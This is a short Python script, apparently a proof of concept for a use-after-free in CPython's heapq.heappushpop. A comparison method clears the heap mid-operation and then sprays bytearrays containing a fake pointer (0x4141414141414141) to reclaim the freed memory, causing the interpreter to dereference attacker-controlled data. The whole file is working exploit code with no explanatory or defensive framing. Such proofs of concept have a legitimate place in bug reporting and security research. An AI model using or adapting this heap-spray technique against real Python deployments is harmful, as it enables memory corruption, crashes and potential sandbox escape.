import heapq
import sys

class Evil1:
    def __eq__(self, other):
        print('In Evil1.__eq__')
        # Free the list top
        heap.clear()
        
        # The list's ob_item was size 2, so 16 bytes.
        # It was freed to pymalloc.
        # We allocate many bytearrays of size 16 to reclaim it.
        # We fill them with a recognizable fake pointer, e.g. 0x4141414141414141
        
        fake_pointer = (0x4141414141414141).to_bytes(8, 'little')
        # We need ob_item[0] and ob_item[1].
        # ob_item[0] is already past (i=0), so we don't care, but let's make it safe.
        # ob_item[1] will be read next.
        payload = (0).to_bytes(8, 'little') + fake_pointer
        
        global spray
        spray = [bytearray(payload) for _ in range(1000)]
        
        return True

class Evil2:
    def __gt__(self, other):
        print('In Evil2.__gt__')
        return True

# Make top a list of size 2.
# We use heap = [[Evil1(), 0]]
heap = [[Evil1(), 0]]

print('Calling heappushpop...')
try:
    heapq.heappushpop(heap, [0, Evil2()])
except Exception as e:
    print('Exception:', e)
print('Done')
